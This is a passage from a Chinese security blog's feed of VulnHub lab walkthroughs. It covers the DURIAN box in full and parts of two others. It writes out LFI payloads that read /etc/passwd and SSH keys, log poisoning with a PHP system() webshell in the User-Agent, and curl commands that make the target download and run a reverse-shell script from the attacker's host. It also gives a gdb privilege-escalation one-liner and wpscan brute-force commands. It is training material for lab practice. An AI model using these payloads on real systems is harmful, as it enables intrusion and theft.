&lt;h3 id=&#34;java代码分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java代码分析&#34;&gt;#&lt;/a&gt; java 代码分析&lt;/h3&gt;
&lt;p&gt;检索服务器文件，看到提示文件与一个 gpg 的加密文件，info.txt 提示要用–batch 来解密 gpg 文件，否则不会让输入密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1462.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;然而直接解密是可以弹出来输入密码的界面的，输入 ssh 爆破出来的密码 nak1nak1… 可以成功解密 gpg 为 jar 文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1463.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;同样的下载到本地，用 jd-gui 打开，开始阅读源码，Cryptor.class 里边定义了一个加、解密方法&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1464.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Main.class 中设有盐值，并且在条件判断正确时为打印 passwd&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1465.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Recources.class 里边是一些加密的字符串&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1466.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;编写 java 代码，进行解密，代码内容如下&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import java.security.NoSuchAlgorithmException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import javax.crypto.BadPaddingException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import javax.crypto.IllegalBlockSizeException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import javax.crypto.NoSuchPaddingException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class Main &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	public static void main(String[] args) throws NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Cryptor cryptor = new Cryptor();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	String plaintext = cryptor.decrypt(cryptor.decrypt(&amp;quot;pr0tect1on1smust&amp;quot;, &amp;quot;/aom7EHcuiCWzNArA72UVn0nnVtJ5jZSPHDmjFPc5KQ=&amp;quot;), &amp;quot;jJ2Mrz4wjZDMSPwDr6TolQ==&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	System.out.println(&amp;quot;[+] Success, the password is : &amp;quot; + plaintext);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1467.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;运行代码，成功解密出来了密码为 ufo_phosXEN&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1468.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;判断一下这个密码属于哪个用户，发现就是 root 用户的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1469.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/149%20DURIAN/</guid>
            <title>VULNHUB 49 DURIAN</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/149%20DURIAN/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2VyZWFsLTEsNzAzLw==&#34;&gt;https://www.vulnhub.com/entry/cereal-1,703/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU3Nzk0MTQuaHRtbA==&#34;&gt;https://www.cnblogs.com/sainet/p/15779414.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 DURIAN：桥接于 192.168.0.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | uniq&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1518.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip 192.168.0.187&lt;/p&gt;
&lt;p&gt;2 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.188 --min-rate=5000&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1519.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1520.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;检索到的有效服务如下所示：&lt;br&gt;
22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用&lt;br&gt;
 80 7080 8000 8088 http：可对 web 进行渗透测试收集信息&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;lfi-漏洞测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-漏洞测试&#34;&gt;#&lt;/a&gt; lfi 漏洞测试&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODgv&#34;&gt;http://192.168.0.188/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1521.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/dirb/wordlists/common.txt -u http://192.168.0.188/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1522.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1523.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLWRhdGEv&#34;&gt;http://192.168.0.172/cgi-data/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1524.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLWRhdGEvZ2V0SW1hZ2UucGhw&#34;&gt;http://192.168.0.172/cgi-data/getImage.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1525.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;有文件包含漏洞，测试读取 /etc/passwd&lt;br&gt;
 &lt;code&gt;view-source:http://192.168.0.172/cgi-data/getImage.php?file=../../../../../etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1526.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到了两个有 bash 的用户，测试能否读取到私钥文件&lt;br&gt;
 &lt;code&gt;view-source:http://192.168.0.172/cgi-data/getImage.php?file=../../../../../home/durian/.ssh/id_rsa&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1527.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有读取到私钥文件，此 lfi 漏洞利用还需要配合其他的漏洞，如果知道了日志文件地址，是可以尝试往日志里边写后门的&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;查看一下其他的信息，获取到更多的信息&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNzIvYmxvZw==&#34;&gt;http://192.168.0.172/blog&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1528.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;7080 站点有一个登陆框，但是不存在弱口令，sql 注入&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1529.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;8000 站点是一张图片，需要目录收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1530.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有发现什么敏感的目录信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1531.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;8088 页面也是一个图片，没有什么特点&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1532.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;搜寻目录之后发现一些特殊的目录&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1533.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现大部分页面都是 403 , 没有利用的价值&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1534.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;有一个界面有登陆框和密码，可以用来爆破&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1535.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;lfi日志文件写木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi日志文件写木马&#34;&gt;#&lt;/a&gt; lfi 日志文件写木马&lt;/h3&gt;
&lt;p&gt;综上是能收集到所有的信息，登陆框处由于缺少用户名，是很难爆破出来的，&lt;/p&gt;
&lt;p&gt;唯一有价值的线索指向了 lfi 漏洞，多次尝试之后找到了日志的路径&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLWRhdGEvZ2V0SW1hZ2UucGhwP2ZpbGU9L3Zhci9sb2cvZHVyaWFuLmxvZy9hY2Nlc3MubG9n&#34;&gt;http://192.168.0.172/cgi-data/getImage.php?file=/var/log/durian.log/access.log&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1536.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;既然信息能够被保存在这里，就给发送一个带木马的信息，修改 UA 头&lt;/p&gt;
&lt;p&gt;这里直接用 curl 命令来写，可以用 burp 将数据转化为 curl 命令&lt;br&gt;
 &lt;code&gt;curl -v -X $&#39;GET&#39; -H $&#39;User-Agent: Mozilla/5.0 &amp;lt;?php system($_GET[\&#39;X_T\&#39;]); ?&amp;gt; (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36&#39; $&#39;http://192.168.0.188/cgi-data/getImage.php?file=/var/log/durian.log/access.log&amp;amp;X_T=whoami&#39;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1537.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并且命令被执行了，收到了 www-data 即当前用户名&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1538.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;既然能够执行命令，那么就准备用日志来反弹 shell，准备如下代码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1539.png&#34; width=&#34;360&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过修改数据报使靶机下载 kali 上准备好的反弹 shell 的代码&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GET http://192.168.0.188/cgi-data/getImage.php?file=/var/log/durian.log/access.log&amp;amp;X_T=wget+http://192.168.0.168/shell.sh+-O+/var/www/html/blog/shell.sh HTTP/1.1&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1540.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;但是失败了，没有下载提示，也没有合适的数据报返回&lt;/p&gt;
&lt;h3 id=&#34;post型木马尝试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#post型木马尝试&#34;&gt;#&lt;/a&gt; post 型木马尝试&lt;/h3&gt;
&lt;p&gt;改为 post 的方式，写一个后门文件看看，居然写成功了，但是不知道怎么访问&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1541.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 lfi 漏洞的位置访问时是无法写入任何文件的，是个假后门&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1542.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并且也不能修改原有的所有代码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1543.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;还是从数据包来下手，可能下载成功了没有回显，索性就直接尝试执行本应该下载好的文件位置的 sh 脚本，看能不能把 shell 反弹出来&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1544.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;但是没有反弹出来，很奇怪&lt;/p&gt;
&lt;h3 id=&#34;防火墙策略&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#防火墙策略&#34;&gt;#&lt;/a&gt; 防火墙策略&lt;/h3&gt;
&lt;p&gt;试了大半天没有结果，直接重新导入靶机了，这次靶机 ip 发生变化了&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1545.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;再次用 burp 捕获数据，思考为什么不能反弹&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1546.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;既然可以执行命令，执行处 id 的结果，说明命令执行没有问题，但是去下载 python 简易 web 上的程序时出错了，很有可能是防火墙的问题，果然一看，防火墙不知道因为什么原因打开了，就一直卡住了&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1547.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;关闭防火墙，再次测试&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1548.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;curl指定数据包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl指定数据包&#34;&gt;#&lt;/a&gt; curl 指定数据包&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用curl发送数据包，下载木马&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -i -s -k -X $&amp;#x27;GET&amp;#x27; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-H $&amp;#x27;User-Agent: Mozilla/5.0 &amp;lt;?php system($_GET[\&amp;#x27;y\&amp;#x27;]);?&amp;gt; (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&amp;#x27; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://192.168.0.172/cgi-data/getImage.php?file=/var/log/durian.log/access.log&amp;amp;y=wget+http://192.168.0.168/shell.sh+-O+/var/www/html/blog/shell1.sh&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1549.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;当看到 python 服务器上有了回馈信息后，就说明是正确的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1550.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;执行下载的程序，并且用来接收shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -i -s -k -X $&amp;#x27;GET&amp;#x27; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-H $&amp;#x27;User-Agent: Mozilla/5.0 &amp;lt;?php system($_GET[\&amp;#x27;y\&amp;#x27;]);?&amp;gt; (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&amp;#x27; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://192.168.0.172/cgi-data/getImage.php?file=/var/log/durian.log/access.log&amp;amp;y=bash+/var/www/html/blog/shell1.sh&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1551.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;成功拿到网站权限，开始提权&lt;/p&gt;
&lt;h3 id=&#34;sudogdb提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudogdb提权&#34;&gt;#&lt;/a&gt; sudo (gdb) 提权&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1saW5wZWFzLTR0M2tnbWkzOHEuc2g=&#34;&gt;放一个 linpeas.sh&lt;/span&gt;, 查到 gdb 权限设置错误&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1552.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;参照 gtfobin，直接提权为 root 用户&lt;br&gt;
 &lt;code&gt;gdb -nx -ex &#39;python import os; os.setuid(0)&#39; -ex &#39;!sh&#39; -ex quit&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1553.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/148%20GITROOT/</guid>
            <title>VULNHUB 48 GITROOT</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/148%20GITROOT/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZ2l0cm9vdC0xLDQ4OC8=&#34;&gt;https://www.vulnhub.com/entry/gitroot-1,488/&lt;/span&gt;&lt;br&gt;
 教程链接地址 1: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL2dpdHJvb3QtMS12dWxuaHViLXdhbGt0aHJvdWdoLw==&#34;&gt;https://www.hackingarticles.in/gitroot-1-vulnhub-walkthrough/&lt;/span&gt;&lt;br&gt;
 教程链接地址 2: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oMGozbi5tZWRpdW0uY29tL3Z1bG5odWItZ2l0cm9vdC0xLWQxZWE1ZGUzZDEwYQ==&#34;&gt;https://h0j3n.medium.com/vulnhub-gitroot-1-d1ea5de3d10a&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 WARZONE3：桥接于 192.168.0.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | uniq&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;靶机开启之前和开启之后各扫一次，得到靶机 ip 192.168.0.187&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1470.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;2 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息&lt;br&gt;
 &lt;code&gt;sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.187 --min-rate=5000&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1471.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;检索到的有效服务如下所示：&lt;br&gt;
22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用&lt;br&gt;
 80 http：可对 web 进行渗透测试收集信息&lt;br&gt;
 11211 memcache：未知端口&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODcv&#34;&gt;http://192.168.0.187/&lt;/span&gt; 进行 http 信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1472.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示我们有一个域名需要检查一下，将这个子域名以及它的上一级域名的 DNS 解析地址进行修改&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1473.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;再次查看子域名，发现是一个 wordpress 站点&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1474.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;而域名处还是原来的界面&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1475.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;对 wordpress 站点进行扫描扫描，获取其存在的用户名&lt;br&gt;
 &lt;code&gt;wpscan -e u --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://wp.gitroot.vuln/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1476.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到一个用户名 beth&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1477.png&#34; width=&#34;410&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;顺便爆破一下这个用户名的密码，但是没有结果&lt;/p&gt;
&lt;p&gt;&lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc -U beth -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://wp.gitroot.vuln/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1478.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;进行目录扫描，看看有没有敏感的站点&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list- 2.3-medium.txt -u http://wp.gitroot.vuln/&lt;/code&gt;&lt;/p&gt;
